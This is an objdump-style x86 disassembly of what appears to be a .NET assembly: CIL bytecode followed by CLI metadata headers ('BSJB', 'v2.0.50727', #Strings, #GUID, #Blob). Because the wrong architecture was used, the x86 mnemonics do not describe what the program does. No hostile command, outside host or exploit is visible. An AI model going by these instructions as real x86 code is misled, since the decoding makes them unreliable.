  40633a:	0d 09 16 fe 01       	or     $0x1fe1609,%eax
  40633f:	13 0f                	adc    (%edi),%ecx
  406341:	11 0f                	adc    %ecx,(%edi)
  406343:	2c 09                	sub    $0x9,%al
  406345:	72 69                	jb     0x4063b0
  406347:	00 00                	add    %al,(%eax)
  406349:	70 13                	jo     0x40635e
  40634b:	04 2b                	add    $0x2b,%al
  40634d:	40                   	inc    %eax
  40634e:	00 09                	add    %cl,(%ecx)
  406350:	17                   	pop    %ss
  406351:	d6                   	salc
  406352:	73 f2                	jae    0x406346
  406354:	00 00                	add    %al,(%eax)
  406356:	0a 13                	or     (%ebx),%dl
  406358:	06                   	push   %es
  406359:	06                   	push   %es
  40635a:	28 f1                	sub    %dh,%cl
  40635c:	00 00                	add    %al,(%eax)
  40635e:	0a 11                	or     (%ecx),%dl
  406360:	06                   	push   %es
  406361:	11 06                	adc    %eax,(%esi)
  406363:	6f                   	outsl  %ds:(%esi),(%dx)
  406364:	f3 00 00             	repz add %al,(%eax)
  406367:	0a 28                	or     (%eax),%ch
  406369:	4f                   	dec    %edi
  40636a:	00 00                	add    %al,(%eax)
  40636c:	06                   	push   %es
  40636d:	13 05 11 05 16 fe    	adc    0xfe160511,%eax
  406373:	01 13                	add    %edx,(%ebx)
  406375:	0f 11 0f             	movups %xmm1,(%edi)
  406378:	2c 09                	sub    $0x9,%al
  40637a:	72 69                	jb     0x4063e5
  40637c:	00 00                	add    %al,(%eax)
  40637e:	70 13                	jo     0x406393
  406380:	04 2b                	add    $0x2b,%al
  406382:	0a 00                	or     (%eax),%al
  406384:	11 06                	adc    %eax,(%esi)
  406386:	6f                   	outsl  %ds:(%esi),(%dx)
  406387:	ec                   	in     (%dx),%al
  406388:	00 00                	add    %al,(%eax)
  40638a:	0a 13                	or     (%ebx),%dl
  40638c:	04 00                	add    $0x0,%al
  40638e:	00 07                	add    %al,(%edi)
  406390:	28 e1                	sub    %ah,%cl
  406392:	00 00                	add    %al,(%eax)
  406394:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  406397:	6f                   	outsl  %ds:(%esi),(%dx)
  406398:	e5 00                	in     $0x0,%eax
  40639a:	00 0a                	add    %cl,(%edx)
  40639c:	6f                   	outsl  %ds:(%esi),(%dx)
  40639d:	31 00                	xor    %eax,(%eax)
  40639f:	00 0a                	add    %cl,(%edx)
  4063a1:	72 5f                	jb     0x406402
  4063a3:	0d 00 70 16 28       	or     $0x28167000,%eax
  4063a8:	32 00                	xor    (%eax),%al
  4063aa:	00 0a                	add    %cl,(%edx)
  4063ac:	16                   	push   %ss
  4063ad:	fe 01                	incb   (%ecx)
  4063af:	08 6f e5             	or     %ch,-0x1b(%edi)
  4063b2:	00 00                	add    %al,(%eax)
  4063b4:	0a 6f 31             	or     0x31(%edi),%ch
  4063b7:	00 00                	add    %al,(%eax)
  4063b9:	0a 72 6f             	or     0x6f(%edx),%dh
  4063bc:	0d 00 70 16 28       	or     $0x28167000,%eax
  4063c1:	32 00                	xor    (%eax),%al
  4063c3:	00 0a                	add    %cl,(%edx)
  4063c5:	16                   	push   %ss
  4063c6:	fe 01                	incb   (%ecx)
  4063c8:	60                   	pusha
  4063c9:	08 6f e5             	or     %ch,-0x1b(%edi)
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	0a 6f 31             	or     0x31(%edi),%ch
  4063d1:	00 00                	add    %al,(%eax)
  4063d3:	0a 72 8b             	or     -0x75(%edx),%dh
  4063d6:	0d 00 70 16 28       	or     $0x28167000,%eax
  4063db:	32 00                	xor    (%eax),%al
  4063dd:	00 0a                	add    %cl,(%edx)
  4063df:	16                   	push   %ss
  4063e0:	fe 01                	incb   (%ecx)
  4063e2:	60                   	pusha
  4063e3:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4063e6:	31 00                	xor    %eax,(%eax)
  4063e8:	00 0a                	add    %cl,(%edx)
  4063ea:	72 a7                	jb     0x406393
  4063ec:	0d 00 70 16 28       	or     $0x28167000,%eax
  4063f1:	32 00                	xor    (%eax),%al
  4063f3:	00 0a                	add    %cl,(%edx)
  4063f5:	16                   	push   %ss
  4063f6:	fe 01                	incb   (%ecx)
  4063f8:	60                   	pusha
  4063f9:	13 0f                	adc    (%edi),%ecx
  4063fb:	11 0f                	adc    %ecx,(%edi)
  4063fd:	39 20                	cmp    %esp,(%eax)
  4063ff:	01 00                	add    %eax,(%eax)
  406401:	00 73 ef             	add    %dh,-0x11(%ebx)
  406404:	00 00                	add    %al,(%eax)
  406406:	0a 13                	or     (%ebx),%dl
  406408:	07                   	pop    %es
  406409:	16                   	push   %ss
  40640a:	13 08                	adc    (%eax),%ecx
  40640c:	02 06                	add    (%esi),%al
  40640e:	6f                   	outsl  %ds:(%esi),(%dx)
  40640f:	54                   	push   %esp
  406410:	00 00                	add    %al,(%eax)
  406412:	06                   	push   %es
  406413:	13 0d 16 13 0c 38    	adc    0x380c1316,%ecx
  406419:	a9 00 00 00 11       	test   $0x11000000,%eax
  40641e:	0d 11 0c 8f 21       	or     $0x218f0c11,%eax
  406423:	00 00                	add    %al,(%eax)
  406425:	01 71 21             	add    %esi,0x21(%ecx)
  406428:	00 00                	add    %al,(%eax)
  40642a:	01 13                	add    %edx,(%ebx)
  40642c:	0b 20                	or     (%eax),%esp
  40642e:	c8 00 00 00          	enter  $0x0,$0x0
  406432:	28 2a                	sub    %ch,(%edx)
  406434:	00 00                	add    %al,(%eax)
  406436:	0a 13                	or     (%ebx),%dl
  406438:	09 11                	or     %edx,(%ecx)
  40643a:	0b 28                	or     (%eax),%ebp
  40643c:	f1                   	int1
  40643d:	00 00                	add    %al,(%eax)
  40643f:	0a 12                	or     (%edx),%dl
  406441:	09 20                	or     %esp,(%eax)
  406443:	c8 00 00 00          	enter  $0x0,$0x0
  406447:	28 4d 00             	sub    %cl,0x0(%ebp)
  40644a:	00 06                	add    %al,(%esi)
  40644c:	13 0a                	adc    (%edx),%ecx
  40644e:	11 09                	adc    %ecx,(%ecx)
  406450:	11 0a                	adc    %ecx,(%edx)
  406452:	20 c8                	and    %cl,%al
  406454:	00 00                	add    %al,(%eax)
  406456:	00 11                	add    %dl,(%ecx)
  406458:	0a da                	or     %dl,%bl
  40645a:	6f                   	outsl  %ds:(%esi),(%dx)
  40645b:	ee                   	out    %al,(%dx)
  40645c:	00 00                	add    %al,(%eax)
  40645e:	0a 13                	or     (%ebx),%dl
  406460:	09 11                	or     %edx,(%ecx)
  406462:	09 6f 31             	or     %ebp,0x31(%edi)
  406465:	00 00                	add    %al,(%eax)
  406467:	0a 72 c9             	or     -0x37(%edx),%dh
  40646a:	0d 00 70 16 28       	or     $0x28167000,%eax
  40646f:	32 00                	xor    (%eax),%al
  406471:	00 0a                	add    %cl,(%edx)
  406473:	16                   	push   %ss
  406474:	fe 01                	incb   (%ecx)
  406476:	13 0f                	adc    (%edi),%ecx
  406478:	11 0f                	adc    %ecx,(%edi)
  40647a:	2c 0a                	sub    $0xa,%al
  40647c:	11 07                	adc    %eax,(%edi)
  40647e:	11 0b                	adc    %ecx,(%ebx)
  406480:	6f                   	outsl  %ds:(%esi),(%dx)
  406481:	f0 00 00             	lock add %al,(%eax)
  406484:	0a 00                	or     (%eax),%al
  406486:	00 11                	add    %dl,(%ecx)
  406488:	09 6f 31             	or     %ebp,0x31(%edi)
  40648b:	00 00                	add    %al,(%eax)
  40648d:	0a 72 d7             	or     -0x29(%edx),%dh
  406490:	0d 00 70 16 28       	or     $0x28167000,%eax
  406495:	32 00                	xor    (%eax),%al
  406497:	00 0a                	add    %cl,(%edx)
  406499:	16                   	push   %ss
  40649a:	fe 01                	incb   (%ecx)
  40649c:	11 09                	adc    %ecx,(%ecx)
  40649e:	6f                   	outsl  %ds:(%esi),(%dx)
  40649f:	31 00                	xor    %eax,(%eax)
  4064a1:	00 0a                	add    %cl,(%edx)
  4064a3:	72 e5                	jb     0x40648a
  4064a5:	0d 00 70 16 28       	or     $0x28167000,%eax
  4064aa:	32 00                	xor    (%eax),%al
  4064ac:	00 0a                	add    %cl,(%edx)
  4064ae:	16                   	push   %ss
  4064af:	fe 01                	incb   (%ecx)
  4064b1:	60                   	pusha
  4064b2:	13 0f                	adc    (%edi),%ecx
  4064b4:	11 0f                	adc    %ecx,(%edi)
  4064b6:	2c 06                	sub    $0x6,%al
  4064b8:	11 08                	adc    %ecx,(%eax)
  4064ba:	17                   	pop    %ss
  4064bb:	d6                   	salc
  4064bc:	13 08                	adc    (%eax),%ecx
  4064be:	00 11                	add    %dl,(%ecx)
  4064c0:	0c 17                	or     $0x17,%al
  4064c2:	d6                   	salc
  4064c3:	13 0c 00             	adc    (%eax,%eax,1),%ecx
  4064c6:	11 0c 11             	adc    %ecx,(%ecx,%edx,1)
  4064c9:	0d 8e b7 fe 04       	or     $0x4feb78e,%eax
  4064ce:	13 0f                	adc    (%edi),%ecx
  4064d0:	11 0f                	adc    %ecx,(%edi)
  4064d2:	3a 46 ff             	cmp    -0x1(%esi),%al
  4064d5:	ff                   	(bad)
  4064d6:	ff 11                	call   *(%ecx)
  4064d8:	07                   	pop    %es
  4064d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4064da:	f4                   	hlt
  4064db:	00 00                	add    %al,(%eax)
  4064dd:	0a 18                	or     (%eax),%bl
  4064df:	fe 01                	incb   (%ecx)
  4064e1:	11 08                	adc    %ecx,(%eax)
  4064e3:	18 fe                	sbb    %bh,%dh
  4064e5:	01 11                	add    %edx,(%ecx)
  4064e7:	08 17                	or     %dl,(%edi)
  4064e9:	fe 01                	incb   (%ecx)
  4064eb:	60                   	pusha
  4064ec:	5f                   	pop    %edi
  4064ed:	13 0f                	adc    (%edi),%ecx
  4064ef:	11 0f                	adc    %ecx,(%edi)
  4064f1:	2c 2e                	sub    $0x2e,%al
  4064f3:	11 07                	adc    %eax,(%edi)
  4064f5:	16                   	push   %ss
  4064f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4064f7:	f5                   	cmc
  4064f8:	00 00                	add    %al,(%eax)
  4064fa:	0a 16                	or     (%esi),%dl
  4064fc:	28 4a 00             	sub    %cl,0x0(%edx)
  4064ff:	00 06                	add    %al,(%esi)
  406501:	26 11 07             	adc    %eax,%es:(%edi)
  406504:	16                   	push   %ss
  406505:	6f                   	outsl  %ds:(%esi),(%dx)
  406506:	f5                   	cmc
  406507:	00 00                	add    %al,(%eax)
  406509:	0a 28                	or     (%eax),%ch
  40650b:	f1                   	int1
  40650c:	00 00                	add    %al,(%eax)
  40650e:	0a 1f                	or     (%edi),%bl
  406510:	0c 16                	or     $0x16,%al
  406512:	72 ff                	jb     0x406513
  406514:	0d 00 70 13 0e       	or     $0xe137000,%eax
  406519:	12 0e                	adc    (%esi),%cl
  40651b:	28 4e 00             	sub    %cl,0x0(%esi)
  40651e:	00 06                	add    %al,(%esi)
  406520:	26 00 00             	add    %al,%es:(%eax)
  406523:	00 00                	add    %al,(%eax)
  406525:	17                   	pop    %ss
  406526:	13 0f                	adc    (%edi),%ecx
  406528:	11 0f                	adc    %ecx,(%edi)
  40652a:	3a bb fd ff ff 00    	cmp    0xfffffd(%ebx),%bh
  406530:	2a 00                	sub    (%eax),%al
  406532:	00 00                	add    %al,(%eax)
  406534:	1b 30                	sbb    (%eax),%esi
  406536:	03 00                	add    (%eax),%eax
  406538:	50                   	push   %eax
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 27                	add    %ah,(%edi)
  40653d:	00 00                	add    %al,(%eax)
  40653f:	11 00                	adc    %eax,(%eax)
  406541:	00 02                	add    %al,(%edx)
  406543:	0b 07                	or     (%edi),%eax
  406545:	28 37                	sub    %dh,(%edi)
  406547:	00 00                	add    %al,(%eax)
  406549:	0a 00                	or     (%eax),%al
  40654b:	00 02                	add    %al,(%edx)
  40654d:	7b 31                	jnp    0x406580
  40654f:	00 00                	add    %al,(%eax)
  406551:	04 6f                	add    $0x6f,%al
  406553:	f6 00 00             	testb  $0x0,(%eax)
  406556:	0a 00                	or     (%eax),%al
  406558:	03 02                	add    (%edx),%eax
  40655a:	25 fe 07 52 00       	and    $0x5207fe,%eax
  40655f:	00 06                	add    %al,(%esi)
  406561:	73 55                	jae    0x4065b8
  406563:	00 00                	add    %al,(%eax)
  406565:	06                   	push   %es
  406566:	16                   	push   %ss
  406567:	28 ba 00 00 0a 0c    	sub    %bh,0xc0a0000(%edx)
  40656d:	12 02                	adc    (%edx),%al
  40656f:	28 51 00             	sub    %dl,0x0(%ecx)
  406572:	00 06                	add    %al,(%esi)
  406574:	26 02 7b 31          	add    %es:0x31(%ebx),%bh
  406578:	00 00                	add    %al,(%eax)
  40657a:	04 6f                	add    $0x6f,%al
  40657c:	f7 00 00 0a 0a de    	testl  $0xde0a0a00,(%eax)
  406582:	0b 00                	or     (%eax),%eax
  406584:	de 08                	fimuls (%eax)
  406586:	07                   	pop    %es
  406587:	28 46 00             	sub    %al,0x0(%esi)
  40658a:	00 0a                	add    %cl,(%edx)
  40658c:	00 dc                	add    %bl,%ah
  40658e:	06                   	push   %es
  40658f:	2a 01                	sub    (%ecx),%al
  406591:	10 00                	adc    %al,(%eax)
  406593:	00 02                	add    %al,(%edx)
  406595:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406598:	3a 46 00             	cmp    0x0(%esi),%al
  40659b:	08 63 00             	or     %ah,0x0(%ebx)
  40659e:	00 00                	add    %al,(%eax)
  4065a0:	42                   	inc    %edx
  4065a1:	53                   	push   %ebx
  4065a2:	4a                   	dec    %edx
  4065a3:	42                   	inc    %edx
  4065a4:	01 00                	add    %eax,(%eax)
  4065a6:	01 00                	add    %eax,(%eax)
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	0c 00                	or     $0x0,%al
  4065ae:	00 00                	add    %al,(%eax)
  4065b0:	76 32                	jbe    0x4065e4
  4065b2:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4065b5:	35 30 37 32 37       	xor    $0x37323730,%eax
  4065ba:	00 00                	add    %al,(%eax)
  4065bc:	00 00                	add    %al,(%eax)
  4065be:	05 00 6c 00 00       	add    $0x6c00,%eax
  4065c3:	00 48 16             	add    %cl,0x16(%eax)
  4065c6:	00 00                	add    %al,(%eax)
  4065c8:	23 7e 00             	and    0x0(%esi),%edi
  4065cb:	00 b4 16 00 00 44 17 	add    %dh,0x17440000(%esi,%edx,1)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	23 53 74             	and    0x74(%ebx),%edx
  4065d7:	72 69                	jb     0x406642
  4065d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4065da:	67 73 00             	addr16 jae 0x4065dd
  4065dd:	00 00                	add    %al,(%eax)
  4065df:	00 f8                	add    %bh,%al
  4065e1:	2d 00 00 18 0e       	sub    $0xe180000,%eax
  4065e6:	00 00                	add    %al,(%eax)
  4065e8:	23 55 53             	and    0x53(%ebp),%edx
  4065eb:	00 10                	add    %dl,(%eax)
  4065ed:	3c 00                	cmp    $0x0,%al
  4065ef:	00 10                	add    %dl,(%eax)
  4065f1:	00 00                	add    %al,(%eax)
  4065f3:	00 23                	add    %ah,(%ebx)
  4065f5:	47                   	inc    %edi
  4065f6:	55                   	push   %ebp
  4065f7:	49                   	dec    %ecx
  4065f8:	44                   	inc    %esp
  4065f9:	00 00                	add    %al,(%eax)
  4065fb:	00 20                	add    %ah,(%eax)
  4065fd:	3c 00                	cmp    $0x0,%al
  4065ff:	00 b8 09 00 00 23    	add    %bh,0x23000009(%eax)
  406605:	42                   	inc    %edx
  406606:	6c                   	insb   (%dx),%es:(%edi)
  406607:	6f                   	outsl  %ds:(%esi),(%dx)
  406608:	62 00                	bound  %eax,(%eax)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	00 00                	add    %al,(%eax)
  406610:	02 00                	add    (%eax),%al
  406612:	00 01                	add    %al,(%ecx)
  406614:	57                   	push   %edi
  406615:	35 a2 1d 09 0e       	xor    $0xe091da2,%eax
  40661a:	00 00                	add    %al,(%eax)
  40661c:	00 fa                	add    %bh,%dl
  40661e:	01 33                	add    %esi,(%ebx)
  406620:	00 16                	add    %dl,(%esi)
  406622:	00 00                	add    %al,(%eax)
  406624:	01 00                	add    %eax,(%eax)
  406626:	00 00                	add    %al,(%eax)
  406628:	7c 00                	jl     0x40662a
  40662a:	00 00                	add    %al,(%eax)
  40662c:	0c 00                	or     $0x0,%al
  40662e:	00 00                	add    %al,(%eax)
  406630:	31 00                	xor    %eax,(%eax)
  406632:	00 00                	add    %al,(%eax)
  406634:	5c                   	pop    %esp
  406635:	00 00                	add    %al,(%eax)
  406637:	00 7b 00             	add    %bh,0x0(%ebx)
  40663a:	00 00                	add    %al,(%eax)
  40663c:	f7 00 00 00 2d 00    	testl  $0x2d0000,(%eax)
  406642:	00 00                	add    %al,(%eax)
  406644:	0b 00                	or     (%eax),%eax
  406646:	00 00                	add    %al,(%eax)
  406648:	27                   	daa
  406649:	00 00                	add    %al,(%eax)
  40664b:	00 02                	add    %al,(%edx)
  40664d:	00 00                	add    %al,(%eax)
  40664f:	00 05 00 00 00 05    	add    %al,0x5000000
  406655:	00 00                	add    %al,(%eax)
  406657:	00 07                	add    %al,(%edi)
  406659:	00 00                	add    %al,(%eax)
  40665b:	00 09                	add    %cl,(%ecx)
  40665d:	00 00                	add    %al,(%eax)
  40665f:	00 1a                	add    %bl,(%edx)
  406661:	00 00                	add    %al,(%eax)
  406663:	00 01                	add    %al,(%ecx)
  406665:	00 00                	add    %al,(%eax)
  406667:	00 05 00 00 00 04    	add    %al,0x4000000
  40666d:	00 00                	add    %al,(%eax)
  40666f:	00 03                	add    %al,(%ebx)
  406671:	00 00                	add    %al,(%eax)
  406673:	00 02                	add    %al,(%edx)
  406675:	00 00                	add    %al,(%eax)
  406677:	00 00                	add    %al,(%eax)
  406679:	00 b7 0f 01 00 00    	add    %dh,0x10f(%edi)
  40667f:	00 00                	add    %al,(%eax)
  406681:	00 06                	add    %al,(%esi)
  406683:	00 2a                	add    %ch,(%edx)
  406685:	00 0a                	add    %cl,(%edx)
  406687:	00 06                	add    %al,(%esi)
  406689:	00 50 00             	add    %dl,0x0(%eax)
  40668c:	0a 00                	or     (%eax),%al
  40668e:	0a 00                	or     (%eax),%al
  406690:	98                   	cwtl
  406691:	00 6e 00             	add    %ch,0x0(%esi)
  406694:	0e                   	push   %cs
  406695:	00 be 00 a8 00 0e    	add    %bh,0xe00a800(%esi)
  40669b:	00 d7                	add    %dl,%bh
  40669d:	00 a8 00 0e 00 04    	add    %ch,0x4000e00(%eax)
  4066a3:	01 ec                	add    %ebp,%esp
  4066a5:	00 06                	add    %al,(%esi)
  4066a7:	00 2e                	add    %ch,(%esi)
  4066a9:	01 1b                	add    %ebx,(%ebx)
  4066ab:	01 0a                	add    %ecx,(%edx)
  4066ad:	00 69 01             	add    %ch,0x1(%ecx)
  4066b0:	4b                   	dec    %ebx
  4066b1:	01 06                	add    %eax,(%esi)
  4066b3:	00 72 01             	add    %dh,0x1(%edx)
  4066b6:	1b 01                	sbb    (%ecx),%eax
  4066b8:	06                   	push   %es
  4066b9:	00 91 01 8a 01 0a    	add    %dl,0xa018a01(%ecx)
  4066bf:	00 bf 01 98 01 0a    	add    %bh,0xa019801(%edi)
  4066c5:	00 ed                	add    %ch,%ch
  4066c7:	01 d7                	add    %edx,%edi
  4066c9:	01 0a                	add    %ecx,(%edx)
  4066cb:	00 05 02 d7 01 06    	add    %al,0x601d702
  4066d1:	00 20                	add    %ah,(%eax)
  4066d3:	02 0a                	add    (%edx),%cl
  4066d5:	00 06                	add    %al,(%esi)
  4066d7:	00 51 02             	add    %dl,0x2(%ecx)
  4066da:	8a 01                	mov    (%ecx),%al
  4066dc:	06                   	push   %es
  4066dd:	00 56 02             	add    %dl,0x2(%esi)
  4066e0:	8a 01                	mov    (%ecx),%al
  4066e2:	06                   	push   %es
  4066e3:	00 83 02 8a 01 06    	add    %al,0x6018a02(%ebx)
  4066e9:	00 bb 02 9c 02 06    	add    %bh,0x6029c02(%ebx)
  4066ef:	00 cf                	add    %cl,%bh
  4066f1:	02 8a 01 06 00 e5    	add    -0x1afff9ff(%edx),%cl
  4066f7:	02 0a                	add    (%edx),%cl
  4066f9:	00 0a                	add    %cl,(%edx)
  4066fb:	00 14 03             	add    %dl,(%ebx,%eax,1)
  4066fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4066ff:	00 0e                	add    %cl,(%esi)
  406701:	00 46 03             	add    %al,0x3(%esi)
  406704:	29 03                	sub    %eax,(%ebx)
  406706:	06                   	push   %es
  406707:	00 5b 03             	add    %bl,0x3(%ebx)
  40670a:	8a 01                	mov    (%ecx),%al
  40670c:	0e                   	push   %cs
  40670d:	00 81 03 6e 03 06    	add    %al,0x6036e03(%ecx)
  406713:	00 95 03 8b 03 06    	add    %dl,0x6038b03(%ebp)
  406719:	00 a0 03 8b 03 06    	add    %ah,0x6038b03(%eax)
  40671f:	00 a9 03 8b 03 06    	add    %ch,0x6038b03(%ecx)
  406725:	00 b6 03 8a 01 0a    	add    %dh,0xa018a03(%esi)
  40672b:	00 bb 03 98 01 06    	add    %bh,0x6019803(%ebx)
  406731:	00 e3                	add    %ah,%bl
  406733:	03 d1                	add    %ecx,%edx
  406735:	03 0e                	add    (%esi),%ecx
  406737:	00 1a                	add    %bl,(%edx)
  406739:	04 0a                	add    $0xa,%al
  40673b:	04 06                	add    $0x6,%al
  40673d:	00 31                	add    %dh,(%ecx)
  40673f:	04 8a                	add    $0x8a,%al
  406741:	01 06                	add    %eax,(%esi)
  406743:	00 3b                	add    %bh,(%ebx)
  406745:	04 8a                	add    $0x8a,%al
  406747:	01 0a                	add    %ecx,(%edx)
  406749:	00 5f 04             	add    %bl,0x4(%edi)
  40674c:	d7                   	xlat   %ds:(%ebx)
  40674d:	01 06                	add    %eax,(%esi)
  40674f:	00 6d 04             	add    %ch,0x4(%ebp)
  406752:	8a 01                	mov    (%ecx),%al
  406754:	0a 00                	or     (%eax),%al
  406756:	7f 04                	jg     0x40675c
  406758:	98                   	cwtl
  406759:	01 06                	add    %eax,(%esi)
  40675b:	00 b9 04 ad 04 06    	add    %bh,0x604ad04(%ecx)
  406761:	00 d5                	add    %dl,%ch
  406763:	04 8b                	add    $0x8b,%al
  406765:	03 0a                	add    (%edx),%ecx
  406767:	00 f4                	add    %dh,%ah
  406769:	04 98                	add    $0x98,%al
  40676b:	01 06                	add    %eax,(%esi)
  40676d:	00 36                	add    %dh,(%esi)
  40676f:	05 25 05 06 00       	add    $0x60525,%eax
  406774:	43                   	inc    %ebx
  406775:	05 25 05 06 00       	add    $0x60525,%eax
  40677a:	57                   	push   %edi
  40677b:	05 8b 03 0e 00       	add    $0xe038b,%eax
  406780:	8f 05 6e 03 06 00    	pop    0x6036e
  406786:	ce                   	into
  406787:	05 8a 01 0a 00       	add    $0xa018a,%eax
  40678c:	d4 05                	aam    $0x5
  40678e:	98                   	cwtl
  40678f:	01 06                	add    %eax,(%esi)
  406791:	00 16                	add    %dl,(%esi)
  406793:	06                   	push   %es
  406794:	8a 01                	mov    (%ecx),%al
  406796:	0a 00                	or     (%eax),%al
  406798:	50                   	push   %eax
  406799:	06                   	push   %es
  40679a:	2f                   	das
  40679b:	06                   	push   %es
  40679c:	0a 00                	or     (%eax),%al
  40679e:	5e                   	pop    %esi
  40679f:	06                   	push   %es
  4067a0:	4b                   	dec    %ebx
  4067a1:	01 06                	add    %eax,(%esi)
  4067a3:	00 7a 06             	add    %bh,0x6(%edx)
  4067a6:	0a 04 0a             	or     (%edx,%ecx,1),%al
  4067a9:	00 c5                	add    %al,%ch
  4067ab:	06                   	push   %es
  4067ac:	d7                   	xlat   %ds:(%ebx)
  4067ad:	01 0a                	add    %ecx,(%edx)
  4067af:	00 d9                	add    %bl,%cl
  4067b1:	06                   	push   %es
  4067b2:	d7                   	xlat   %ds:(%ebx)
  4067b3:	01 0a                	add    %ecx,(%edx)
  4067b5:	00 e8                	add    %ch,%al
  4067b7:	06                   	push   %es
  4067b8:	d7                   	xlat   %ds:(%ebx)
  4067b9:	01 06                	add    %eax,(%esi)
  4067bb:	00 fc                	add    %bh,%ah
  4067bd:	06                   	push   %es
  4067be:	0a 04 0e             	or     (%esi,%ecx,1),%al
  4067c1:	00 25 07 1a 07 12    	add    %ah,0x12071a07
  4067c7:	00 44 07 2f          	add    %al,0x2f(%edi,%eax,1)
  4067cb:	07                   	pop    %es
  4067cc:	12 00                	adc    (%eax),%al
  4067ce:	56                   	push   %esi
  4067cf:	07                   	pop    %es
  4067d0:	2f                   	das
  4067d1:	07                   	pop    %es
  4067d2:	0e                   	push   %cs
  4067d3:	00 65 07             	add    %ah,0x7(%ebp)
  4067d6:	1a 07                	sbb    (%edi),%al
  4067d8:	16                   	push   %ss
  4067d9:	00 7f 07             	add    %bh,0x7(%edi)
  4067dc:	70 07                	jo     0x4067e5
  4067de:	16                   	push   %ss
  4067df:	00 86 07 70 07 16    	add    %al,0x16077007(%esi)
  4067e5:	00 8b 07 70 07 16    	add    %cl,0x16077007(%ebx)
  4067eb:	00 95 07 70 07 0e    	add    %dl,0xe077007(%ebp)
  4067f1:	00 9e 07 1b 01 0a    	add    %bl,0xa011b07(%esi)
  4067f7:	00 ac 07 d7 01 12 00 	add    %ch,0x1201d7(%edi,%eax,1)
  4067fe:	be 07 2f 07 12       	mov    $0x12072f07,%esi
  406803:	00 cb                	add    %cl,%bl
  406805:	07                   	pop    %es
  406806:	2f                   	das
  406807:	07                   	pop    %es
  406808:	06                   	push   %es
  406809:	00 e8                	add    %ch,%al
  40680b:	07                   	pop    %es
  40680c:	8a 01                	mov    (%ecx),%al
  40680e:	06                   	push   %es
  40680f:	00 ff                	add    %bh,%bh
  406811:	07                   	pop    %es
  406812:	8a 01                	mov    (%ecx),%al
  406814:	06                   	push   %es
  406815:	00 0a                	add    %cl,(%edx)
  406817:	08 0a                	or     %cl,(%edx)
  406819:	04 12                	add    $0x12,%al
  40681b:	00 1c 08             	add    %bl,(%eax,%ecx,1)
  40681e:	2f                   	das
  40681f:	07                   	pop    %es
  406820:	06                   	push   %es
  406821:	00 28                	add    %ch,(%eax)
  406823:	08 8b 03 06 00 39    	or     %cl,0x39000603(%ebx)
  406829:	08 8b 03 0a 00 4c    	or     %cl,0x4c000a03(%ebx)
  40682f:	08 4b 01             	or     %cl,0x1(%ebx)
  406832:	0a 00                	or     (%eax),%al
  406834:	61                   	popa
  406835:	08 d7                	or     %dl,%bh
  406837:	01 0e                	add    %ecx,(%esi)
  406839:	00 74 08 1a          	add    %dh,0x1a(%eax,%ecx,1)
  40683d:	07                   	pop    %es
  40683e:	0e                   	push   %cs
  40683f:	00 84 08 6e 03 0e 00 	add    %al,0xe036e(%eax,%ecx,1)
  406846:	92                   	xchg   %eax,%edx
  406847:	08 6e 03             	or     %ch,0x3(%esi)
  40684a:	0e                   	push   %cs
  40684b:	00 9d 08 6e 03 0e    	add    %bl,0xe036e08(%ebp)
  406851:	00 aa 08 1a 07 12    	add    %ch,0x12071a08(%edx)
  406857:	00 59 09             	add    %bl,0x9(%ecx)
  40685a:	2f                   	das
  40685b:	07                   	pop    %es
  40685c:	16                   	push   %ss
  40685d:	00 a9 09 92 09 16    	add    %ch,0x16099209(%ecx)
  406863:	00 b5 09 70 07 16    	add    %dh,0x16077009(%ebp)
  406869:	00 c5                	add    %al,%ch
  40686b:	09 70 07             	or     %esi,0x7(%eax)
  40686e:	16                   	push   %ss
  40686f:	00 e7                	add    %ah,%bh
  406871:	09 70 07             	or     %esi,0x7(%eax)
  406874:	12 00                	adc    (%eax),%al
  406876:	fa                   	cli
  406877:	09 2f                	or     %ebp,(%edi)
  406879:	07                   	pop    %es
  40687a:	16                   	push   %ss
  40687b:	00 1d 0a 92 09 06    	add    %bl,0x609920a
  406881:	00 48 0a             	add    %cl,0xa(%eax)
  406884:	8b 03                	mov    (%ebx),%eax
  406886:	06                   	push   %es
  406887:	00 64 0a 8a          	add    %ah,-0x76(%edx,%ecx,1)
  40688b:	01 06                	add    %eax,(%esi)
  40688d:	00 6d 0a             	add    %ch,0xa(%ebp)
  406890:	8a 01                	mov    (%ecx),%al
  406892:	0a 00                	or     (%eax),%al
  406894:	b1 0a                	mov    $0xa,%cl
  406896:	4b                   	dec    %ebx
  406897:	01 06                	add    %eax,(%esi)
  406899:	00 de                	add    %bl,%dh
  40689b:	0a 8a 01 63 01 0c    	or     0xc016301(%edx),%cl
  4068a1:	0b 00                	or     (%eax),%eax
  4068a3:	00 06                	add    %al,(%esi)
  4068a5:	00 31                	add    %dh,(%ecx)
  4068a7:	0b 0a                	or     (%edx),%ecx
  4068a9:	04 06                	add    $0x6,%al
  4068ab:	00 67 0b             	add    %ah,0xb(%edi)
  4068ae:	8b 03                	mov    (%ebx),%eax
  4068b0:	06                   	push   %es
  4068b1:	00 76 0b             	add    %dh,0xb(%esi)
  4068b4:	8b 03                	mov    (%ebx),%eax
  4068b6:	12 00                	adc    (%eax),%al
  4068b8:	83 0b 2f             	orl    $0x2f,(%ebx)
  4068bb:	07                   	pop    %es
  4068bc:	06                   	push   %es
  4068bd:	00 cd                	add    %cl,%ch
  4068bf:	0b 8b 03 0a 00 d6    	or     -0x29fff5fd(%ebx),%ecx
  4068c5:	0b 2f                	or     (%edi),%ebp
  4068c7:	06                   	push   %es
  4068c8:	0a 00                	or     (%eax),%al
  4068ca:	f5                   	cmc
  4068cb:	0b 2f                	or     (%edi),%ebp
  4068cd:	06                   	push   %es
  4068ce:	06                   	push   %es
  4068cf:	00 35 0c 8b 03 06    	add    %dh,0x6038b0c
  4068d5:	00 50 0c             	add    %dl,0xc(%eax)
